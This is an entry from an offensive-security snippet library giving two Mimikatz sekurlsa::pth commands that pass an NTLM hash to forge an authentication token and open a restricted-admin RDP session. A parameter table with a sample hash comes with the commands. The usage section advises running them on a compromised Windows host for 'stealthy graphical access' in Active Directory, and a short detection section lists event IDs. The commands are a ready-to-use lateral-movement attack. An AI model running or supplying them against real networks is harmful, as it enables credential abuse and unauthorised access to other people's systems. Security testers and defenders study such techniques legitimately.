---
type: code
language: mimikatz
verified: true
created_at: '2023-04-06T03:56:05Z'
updated_at: '2023-04-10T20:25:57Z'
platforms:
  - Windows
tags:
  - lateral-movement
  - pass-the-hash
  - rdp
validated: true
---

# mimikatz-pass-the-hash-rdp-connection

## Code

```mimikatz
sekurlsa::pth /user:$_USERNAME /domain:$_DOMAIN /ntlm:$_NTLM_HASH
sekurlsa::pth /user:$_USERNAME /domain:$_DOMAIN /ntlm:$_NTLM_HASH /run:"mstsc.exe /restrictedadmin"
```

## Description

This Mimikatz sequence uses sekurlsa::pth to perform Pass-the-Hash, creating an authentication token from the NTLM hash and launching an RDP connection in restricted admin mode to a remote target.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_USERNAME | Username for the token | Administrator |
| $_DOMAIN | Domain name | contoso.local |
| $_NTLM_HASH | NTLM hash of the user | b73fdfe10e87b4ca5c0d957f81de6863 |

## Usage

Execute Mimikatz as admin on a compromised Windows host. The first command creates the token; the second launches RDP (configure target IP in RDP client). Use for stealthy graphical access in AD environments. Restricted mode prevents credential caching.

## Detection

- Mimikatz process execution or LSASS access (Sysmon Event ID 10 with sensitive P=1.1 calls)
- Unusual RDP logons (Event ID 1149) or mstsc.exe spawning without interactive logon
- Network connections to port 3389 from internal hosts

## Related

- [[procedures/Pass-the-Hash-Active-Directory-Attack]]
- [[tools/Mimikatz]]
